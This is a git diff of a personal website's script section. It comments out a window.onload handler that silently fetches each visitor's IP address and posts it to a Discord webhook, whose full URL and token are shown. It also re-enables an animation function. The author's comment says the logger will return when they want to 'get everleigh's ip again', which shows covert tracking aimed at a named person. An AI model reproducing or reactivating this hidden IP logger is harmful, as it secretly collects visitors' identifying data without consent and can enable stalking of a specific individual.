@@ -177,10 +177,12 @@ img, div, ul { max-width: 100%; box-sizing: border-box; }
 .shaking{animation:s .3s infinite}
 </style>
 <script>
+    /*
+    one day this brave soldier will return when I am ready to get everleigh's ip again
     window.onload = function(){
     fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>fetch('https://discord.com/api/webhooks/1523879767424630854/S7aJ-FP3uMEi20xPgdFG-cjXUFqqKMghKz1RFNisl_cxfOBzog40U9vjTRCVfWaO5iVe',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`Visitor IP: ${d.ip}`})}));
-    };
-        /*function crashout(){
+    };*/
+        function crashout(){
   const a=document.getElementById('madness-audio'),w=document.getElementById('celeste-wrapper'),s=document.getElementById('celeste-sprite'),t=document.getElementById('madness-text');
   const m=[[0,'C1.webp'],[1,'C2.webp'],[2,'C3.webp'],[3,'C4.webp'],[4,'C5.webp']];
   a.currentTime=0;a.play();w.style.display="block";s.classList.remove('shaking');t.style.color="red";t.style.fontWeight="bold";
@@ -190,9 +192,12 @@ img, div, ul { max-width: 100%; box-sizing: border-box; }
     if(a.currentTime>=4)s.classList.add('shaking');
   },50);
   a.onended=()=>{clearInterval(i);w.style.display="none";s.classList.remove('shaking');t.style.color="";t.style.fontWeight=""};
-}*/
+}
 </script>
 <script>
+    //imgine usign the zutppia phocks as ur pfp 
+
+    //i think i am high.. higher than cloud
 const el=document.getElementById('commit-date'),fmt=d=>{const dt=new Date(d);el.innerText=dt.toLocaleDateString()+' '+dt.toLocaleTimeString()};
 fetch('https://api.github.com/repos/Voblit/voblit.github.io/commits/main')
   .then(r=>r.json()).then(d=>fmt(d.commit.author.date))
